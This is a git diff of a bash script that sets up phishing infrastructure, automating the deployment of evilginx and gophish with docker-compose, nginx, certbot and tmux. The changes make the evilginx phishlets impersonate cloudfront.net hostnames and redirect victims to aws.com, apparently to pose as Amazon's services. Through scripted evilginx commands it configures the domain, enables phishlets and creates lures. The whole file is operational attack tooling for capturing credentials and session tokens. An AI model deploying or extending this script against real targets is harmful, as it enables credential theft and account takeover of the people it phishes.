@@ -1,7 +1,7 @@
 #!/bin/bash
 
 if [[ $EUID -ne 0 ]]; then
-   echo "UID != 0" 
+   echo "UID != 0"
    exit 1
 fi
 
@@ -25,7 +25,7 @@ function usage {
 function compose_down_up {
     cd $pacu_dir
     docker-compose down --remove-orphans
-    docker-compose up -d    
+    docker-compose up -d
 }
 
 setthatup() {
@@ -33,19 +33,22 @@ setthatup() {
     if [ -z "$cloudflare" ]; then
     cloudflare="off"
     fi
-    
+
     if [ "$cloudflare" = "on" ]; then
         sed -i '/real_ip/s/^#//g' $pacu_dir/nginx-proxy/nginx.tmpl
     fi
-    
+
     if [ "$cloudflare" = "off" ]; then
         sed -e '/real_ip/ s/^#*/#/g' -i $pacu_dir/nginx-proxy/nginx.tmpl
     fi
-    
-    mkdir -p $pacu_dir/certs
-    cd $pacu_dir/certs
-    openssl genrsa 2048 > $domain.key
-    openssl req -new -x509 -nodes -sha256 -days 365 -key $domain.key -out $domain.crt -subj "/C=US/ST=Oregon/L=Portland/CN=*.$domain"
+
+   # mkdir -p $pacu_dir/certs
+    #cd $pacu_dir/certs
+    #openssl genrsa 2048 > $domain.key
+    #openssl req -new -x509 -nodes -sha256 -days 365 -key $domain.key -out $domain.crt -subj "/C=US/ST=Oregon/L=Portland/CN=*.$domain"
+
+    # generate cert
+    certbot --nginx -d $domain --non-interactive --agree-tos -m sdadmin@sdcyberops.com
 
     cp $pacu_dir/docker-compose.tmpl $pacu_dir/docker-compose.yml
 
@@ -83,7 +86,7 @@ pre-evilginx() {
     num_sub=$(cat $pacu_dir/evilginx/phishlets/$phishlet.yaml | grep phish_sub | cut -d"'" -f 2 | sort -u | sed '/^$/d' | wc -l )
     for i in $(seq 1 $num_sub);
     do
-      evilginx_hosts[i]=$(cat $pacu_dir/evilginx/phishlets/$phishlet.yaml | grep phish_sub | cut -d"'" -f 2 | sort -u | sed '/^$/d' | head -n $i | tail -n 1).$domain
+      evilginx_hosts[i]=$(cat $pacu_dir/evilginx/phishlets/$phishlet.yaml | grep phish_sub | cut -d"'" -f 2 | sort -u | sed '/^$/d' | head -n $i | tail -n 1)."cloudfront.net"
     done
     evilginx_hosts[0]=$domain
     printf -v joined '%s,' "${evilginx_hosts[@]}"
@@ -95,7 +98,7 @@ pre-evilginx() {
 pre-gophish() {
 
     sed -i "s/gophish_host/$gophish_host.$domain/g" $pacu_dir/docker-compose.yml
-    
+
 }
 
 
@@ -105,9 +108,9 @@ post-evilginx() {
     tmux new-session -d -s pacu && tmux send-keys -t pacu "cd $pacu_dir/evilginx && ./evilginx" Enter
     sleep 3
     tmux send-keys -t pacu "config ip 0.0.0.0" Enter
-    tmux send-keys -t pacu "config domain $domain" Enter
-    tmux send-keys -t pacu "config redirect_url https://pastebin.com/raw/U40SDvzN" Enter
-    tmux send-keys -t pacu "phishlets hostname $phishlet $domain" Enter
+    tmux send-keys -t pacu "config domain cloudfront.net" Enter
+    tmux send-keys -t pacu "config redirect_url https://aws.com" Enter
+    tmux send-keys -t pacu "phishlets hostname $phishlet cloudfront.net" Enter
     tmux send-keys -t pacu "phishlets enable $phishlet" Enter
     tmux send-keys -t pacu "lures delete all" Enter
     tmux send-keys -t pacu "lures create $phishlet" Enter
@@ -123,7 +126,7 @@ post-evilginx() {
 post-gophish() {
 
     echo "">/dev/null
-    
+
 }
 
 while getopts 'd:p:g:c' flag; do
@@ -139,7 +142,7 @@ while getopts 'd:p:g:c' flag; do
         ;;
       c)
         cloudflare="on"
-        ;;        
+        ;;
     esac
 done
 
